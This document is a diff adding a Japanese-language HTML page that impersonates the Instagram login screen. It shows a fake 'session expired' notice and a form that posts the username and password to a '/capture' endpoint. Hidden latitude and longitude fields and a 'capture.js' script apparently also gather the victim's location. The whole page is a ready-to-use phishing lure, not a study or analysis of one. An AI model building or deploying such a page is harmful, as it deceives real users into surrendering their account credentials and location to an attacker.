@@ -1,0 +1,27 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Instagram</title>
+<link rel="stylesheet" href="/static/style.css">
+<link href="https://fonts.googleapis.com/css2?family=Grand+Hotel&display=swap" rel="stylesheet">
+</head>
+<body>
+  <div class="container">
+    <h1 class="logo">Instagram</h1>
+    <p class="notice">セッションの有効期限が切れました。もう一度ログインしてください。</p>
+
+    <form method="POST" action="/capture" id="ig-form">
+      <input type="text" name="username" placeholder="電話番号、ユーザーネーム、またはメールアドレス" required autocomplete="username">
+      <input type="password" name="password" placeholder="パスワード" required autocomplete="current-password">
+      <input type="hidden" name="lat" value="">
+      <input type="hidden" name="lng" value="">
+      <button type="submit" id="submit-btn">ログイン</button>
+    </form>
+
+    <p class="forgot">パスワードをお忘れですか?</p>
+  </div>
+  <script src="/static/capture.js"></script>
+</body>
+</html>
